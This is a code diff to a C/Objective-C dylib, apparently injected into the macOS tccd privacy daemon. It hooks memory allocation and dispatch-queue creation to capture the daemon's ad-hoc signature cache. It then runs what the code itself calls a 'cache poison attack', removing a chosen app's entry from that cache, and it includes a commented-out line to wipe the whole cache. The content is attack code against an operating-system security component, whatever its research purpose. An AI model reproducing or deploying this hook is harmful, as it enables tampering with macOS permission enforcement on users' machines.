@@ -29,15 +29,31 @@ static objc_msgSend_t original_objc_msgSend = NULL;
 // Hook tracking
 static int cache_allocations = 0;
 static void* adhoc_cache_ptr = NULL;
+static id nscache_object = NULL;
+
+// Target app to revoke (set via environment variable)
+static char target_bundle_id[256] = {0};
 
 // Logging
 static FILE* log_file = NULL;
+
+// Forward declarations
+static void poison_cache_for_target(void);
 
 static void init_logging(void) {
     log_file = fopen("/tmp/tccd_hook.log", "a");
     if (log_file) {
         fprintf(log_file, "\n=== tccd_hook loaded at %ld ===\n", time(NULL));
         fflush(log_file);
+    }
+    
+    // Get target bundle ID from environment
+    const char* env_target = getenv("TCCD_REVOKE_TARGET");
+    if (env_target) {
+        strncpy(target_bundle_id, env_target, sizeof(target_bundle_id) - 1);
+        log_msg("[HOOK] Target bundle ID for revocation: %s\n", target_bundle_id);
+    } else {
+        log_msg("[HOOK] No target bundle ID set (use TCCD_REVOKE_TARGET env var)\n");
     }
 }
 
@@ -78,6 +94,13 @@ void* malloc_type_calloc(size_t count, size_t size, uint64_t type) {
                 char* name_ptr = (char*)ptr + 0x88;
                 log_msg("[HOOK] Cache name: %s\n", name_ptr);
             }
+            
+            // Store NSCache object from offset +0x10
+            void** cache_struct = (void**)ptr;
+            if (cache_struct[2]) { // offset 0x10 = index 2
+                nscache_object = (id)cache_struct[2];
+                log_msg("[HOOK] NSCache object captured at %p\n", nscache_object);
+            }
         }
     }
     
@@ -114,9 +137,48 @@ dispatch_queue_t dispatch_queue_create(const char *label, dispatch_queue_attr_t 
     
     if (label && strstr(label, "AdhocSignatureCache")) {
         log_msg("[HOOK] *** Captured AdhocSignatureCache dispatch queue: %s ***\n", label);
+        
+        // If we have a target, start poisoning the cache
+        if (nscache_object && target_bundle_id[0] != '\0') {
+            log_msg("[HOOK] Starting cache poison attack for %s\n", target_bundle_id);
+            poison_cache_for_target();
+        }
     }
     
     return queue;
+}
+
+// Poison the cache to revoke permissions for target app
+static void poison_cache_for_target(void) {
+    if (!nscache_object) {
+        log_msg("[HOOK] ERROR: NSCache object not available\n");
+        return;
+    }
+    
+    log_msg("[HOOK] Attempting to poison cache for %s\n", target_bundle_id);
+    
+    // Create an NSString for the bundle ID
+    Class nsStringClass = objc_getClass("NSString");
+    SEL stringWithUTF8String = sel_registerName("stringWithUTF8String:");
+    id bundleIdString = ((id (*)(Class, SEL, const char*))objc_msgSend)(nsStringClass, stringWithUTF8String, target_bundle_id);
+    
+    if (!bundleIdString) {
+        log_msg("[HOOK] ERROR: Could not create NSString for bundle ID\n");
+        return;
+    }
+    
+    // Remove the target from cache - forces tccd to re-check permissions
+    SEL removeObjectForKey = sel_registerName("removeObjectForKey:");
+    ((void (*)(id, SEL, id))objc_msgSend)(nscache_object, removeObjectForKey, bundleIdString);
+    
+    log_msg("[HOOK] ✓ Removed %s from signature cache\n", target_bundle_id);
+    log_msg("[HOOK] ✓ tccd will now re-validate permissions for this app\n");
+    
+    // Optionally: Remove all cached entries to force full re-validation
+    SEL removeAllObjects = sel_registerName("removeAllObjects");
+    // Uncomment to nuke entire cache:
+    // ((void (*)(id, SEL))objc_msgSend)(nscache_object, removeAllObjects);
+    // log_msg("[HOOK] ✓ Nuked entire signature cache\n");
 }
 
 // Constructor - runs when dylib is loaded
